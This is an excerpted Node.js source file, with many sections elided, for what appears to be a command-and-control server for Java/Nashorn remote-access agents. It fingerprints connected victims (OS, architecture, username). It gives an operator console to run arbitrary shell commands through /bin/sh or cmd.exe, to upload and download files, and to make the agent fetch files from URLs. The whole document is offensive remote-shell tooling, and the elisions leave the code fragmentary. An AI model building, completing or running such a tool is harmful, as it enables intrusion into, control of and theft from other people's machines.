...
const agents = [];
const history = [];
const longtime_commands = ['help', 'exit', 'agents', 'agent'];
const longtime_help =
...
const sunshine_commands = ['help', 'exit', 'exec', 'upload', 'download', 'get'];
const sunshine_help =
  'The following commands are supported:\n\n' +
  'help - this message\n' +
  ...
  'get <url> <remote file> - the agent downloads from the url and creates the remote file\n';
...
const server = net.createServer(function (socket) {
  ...
  //
  // 1. Connection received -> query arch
  // 2. Arch received -> query os
  // 3. OS received -> query username
  // 4. Username received -> consider this an established agent. Add to agent list
  //
  // The protocol is pretty bad at the moment. We have to send all Nashorn in a
  // a single line. We wrap the command responses in stuff like '---cmd-start'
  // and '---cmd-end' to find the start and the end. It's not beautiful but
  ...
  socket.on('data', function (data) {
    if (!socket.os) {
      socket.os = data;
      socket.write(
        'function exec() { return java.lang.System.getProperty("os.arch") }\n'
      );
    } else if (!socket.arch) {
      socket.arch = data;
      socket.write(
        'function exec() { return java.lang.System.getProperty("os.version") }\n'
      );
    } else if (!socket.version) {
      socket.version = data;
      socket.write(
        'function exec() { return java.lang.System.getProperty("user.name") }\n'
      );
    } else if (!socket.user) {
      // established agent. Allow the user to see it
      agents.push(socket);
      socket.user = data;
      ...
      const end = data.indexOf('---cmd-end');
      if (end >= 0) {
        socket.state = null;
      ...
      const end = data.indexOf('---dwn-end');
      if (end > 0) {
        socket.state = null;
        data = data.slice(0, end);
  ...
  socket.write(
    'function exec() { return java.lang.System.getProperty(' +
      '"os.name") }\n'
  );
});
    ...
    function (error, input) {
      ...
      if (input) {
        ...
        if (input === 'help') {
          ...
          const command_array = input.match(/^exec (.+)/);
          if (!command_array) {
            ...
            if (socket.os.indexOf('Windows') === -1) {
              command +=
                'carray[0] = "/bin/sh";' + 'carray[1] = "-c";';
            } else {
              command +=
                'carray[0] = "cmd.exe";' + 'carray[1] = "/c";';
            }
            command +=
              'carray[2] = "' +
              command_array[1] +
          ...
          const upload_array = input.match(/^upload ([^ ]+) (.+)$/);
          if (!upload_array) {
            term('malformed command.');
          } else {
            const file_data = fs.readFileSync(upload_array[1]);
            const file_data_base64 = file_data.toString('base64');
            ...
            const command =
              ...
              'fos.write(java.util.Base64.getDecoder().decode("' +
              file_data_base64 +
              '"));' +
              'fos.close();' +
              'return "---upload-end";' +
          ...
          const download_array = input.match(/^download ([^ ]+) (.+)$/);
          if (!download_array) {
            term('malformed command.');
          } else {
          ...
          const get_array = input.match(/^get (https?:\/\/[^ ]+) (.+)$/);
          if (!get_array) {
            term('malformed command.');
          } else {
            const command =
  ...
  term.inputField(
    ...
    function (error, input) {
      ...
      if (input) {
        ...
        const matches_array = input.match(agent_select);
        if (input === 'help') {
          term(longtime_help);
        } else if (input === 'exit') {
          process.exit();
